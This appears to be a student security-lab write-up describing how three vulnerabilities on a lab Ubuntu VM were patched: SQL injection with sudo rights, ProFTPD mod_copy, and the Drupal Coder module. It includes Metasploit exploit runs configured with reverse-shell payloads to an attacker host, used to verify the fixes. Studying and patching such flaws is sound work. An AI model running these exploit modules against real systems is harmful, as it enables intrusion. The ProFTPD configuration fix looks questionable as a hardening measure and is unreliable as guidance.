# Level 1 (Linux)

## patch 1: sql injection and ssh
**1.1 Gain Root Access**  
First, we logged into the system using the credentials obtained from the SQL Injection attack (```leia_organa```) and escalated privileges to root. This step is necessary to modify system files and user permissions.
```bash
┌──(kali㉿kali)-[~]
└─$ ssh leia_organa@10.0.2.15            
leia_organa@10.0.2.15's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
New release '16.04.7 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Dec  9 12:57:09 2025 from 10.0.2.4
leia_organa@SEC-NYCU-PMELin:~$ sudo su
[sudo] password for leia_organa: 
root@SEC-NYCU-PMELin:/home/leia_organa# 
```
**1.2 Patching SQL Injection (Service Termination)**  
Since the ```payroll_app.php``` contains unfixable legacy code vulnerable to SQL Injection, we decided to terminate this specific endpoint. We created a backup of the original file (```.bak```) and replaced the active file with a maintenance message to prevent further exploitation.  

Managerial Justification:  
> The ```payroll_app.php``` module relies on insecure implementation patterns (concatenating user input) that cannot be safely patched without a complete rewrite. Due to the critical risk of credential exfiltration, we have opted to terminate access to this specific endpoint immediately while keeping the rest of the web server online. This decision aligns with the security policy of neutralizing unfixable vulnerabilities.
```bash
root@SEC-NYCU-PMELin:/home/leia_organa# cp /var/www/html/payroll_app.php /var/www/html/payroll_app.php.bak
root@SEC-NYCU-PMELin:/home/leia_organa# echo "<?php die('System under maintenance (Patched by Group 2)'); ?>" > /var/www/html/payroll_app.php
```
**1.3 Patching Weak Privileges (Revoking Sudo)**  
The compromised user ```leia_organa``` had insecure administrative rights. We removed the user from the sudo group to prevent future privilege escalation.

**Verification**  
After removal, we switched back to the user ```leia_organa``` and attempted to run ```sudo su```. The system correctly denied access, confirming the patch.
```bash
root@SEC-NYCU-PMELin:/home/leia_organa# deluser leia_organa sudo
Removing user `leia_organa' from group `sudo' ...
Done.
root@SEC-NYCU-PMELin:/home/leia_organa# su - leia_organa
leia_organa@SEC-NYCU-PMELin:~$ sudo su
[sudo] password for leia_organa: 
leia_organa is not in the sudoers file.  This incident will be reported.
```

## patch 2: proftpd
**2.1 Gain Root Access**
```bash
┌──(kali㉿kali)-[~]
└─$ ssh leia_organa@10.0.2.15            
leia_organa@10.0.2.15's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
New release '16.04.7 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Dec  9 12:57:09 2025 from 10.0.2.4
leia_organa@SEC-NYCU-PMELin:~$ sudo su
[sudo] password for leia_organa: 
root@SEC-NYCU-PMELin:/home/leia_organa# 
```
**2.2 Configuration Hardening**  
The standard configuration file was not in ```/etc```. We used the find command to locate the correct path (```/opt/proftpd/etc/proftpd.conf```) and opened it for editing.
```bash
root@SEC-NYCU-PMELin:/home/leia_organa# find / -name proftpd.conf 2>/dev/null
/opt/proftpd/etc/proftpd.conf
root@SEC-NYCU-PMELin:/home/leia_organa# nano /opt/proftpd/etc/proftpd.conf
```
**Applied Configuration**   
We added the following directive to restrict the ```mod_copy``` functionality to the root user only, preventing unauthenticated users from copying malicious files.
```bash
<IfModule mod_copy.c>
  UserOwner root
  GroupOwner root
</IfModule>
```
**2.3 Restart and Verification**  
We restarted the ProFTPD service to apply the changes.
```bash
service proftpd restart
```
**Verification**   
We ran the Metasploit exploit module against the target. The result ```Exploit failed [unreachable]: Rex::ConnectionRefused``` indicates that the exploit can no longer communicate with the vulnerable service in the expected way, confirming the patch is effective.
```bash
msf6 > use exploit/unix/ftp/proftpd_modcopy_exec
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 10.0.2.15
RHOSTS => 10.0.2.15
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set LHOST 10.0.2.4
LHOST => 10.0.2.4
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
SITEPATH => /var/www/html
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > run
[*] Started reverse TCP handler on 10.0.2.4:4444 
[-] 10.0.2.15:80 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.0.2.15:21).
[*] Exploit completed, but no session was created.
```
## patch 3: drupal
**3.1Gain Root Access**
```bash
┌──(kali㉿kali)-[~]
└─$ ssh leia_organa@10.0.2.15            
leia_organa@10.0.2.15's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
New release '16.04.7 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Dec  9 12:57:09 2025 from 10.0.2.4
leia_organa@SEC-NYCU-PMELin:~$ sudo su
[sudo] password for leia_organa: 
root@SEC-NYCU-PMELin:/home/leia_organa# 
```
**3.2 Locate and Remove Vulnerable Module**  
We identified the location of the vulnerable script ```coder_upgrade.run.php``` using the ```find``` command. Since the "Coder" module is a development tool not required for production, we removed the entire module directory to eliminate the attack surface.
```bash
root@SEC-NYCU-PMELin:/home/leia_organa# find / -name coder_upgrade.run.php 2>/dev/null
/var/www/html/drupal/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php
root@SEC-NYCU-PMELin:/home/leia_organa# rm -rf /var/www/html/drupal/sites/all/modules/coder
```
**Verification**  
We attempted to exploit the system again using Metasploit. The output ```Exploit completed, but no session was created``` confirms that the payload was sent but failed to execute because the vulnerable file no longer exists. The patch is successful.
```bash
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > use exploit/unix/webapp/drupal_coder_exec
[*] No payload configured, defaulting to cmd/unix/reverse_bash
msf6 exploit(unix/webapp/drupal_coder_exec) > set RHOSTS 10.0.2.15
RHOSTS => 10.0.2.15
msf6 exploit(unix/webapp/drupal_coder_exec) > set TARGETURI /drupal
TARGETURI => /drupal
msf6 exploit(unix/webapp/drupal_coder_exec) > run
[*] Started reverse TCP handler on 10.0.2.4:4444 
[*] Exploit completed, but no session was created.
```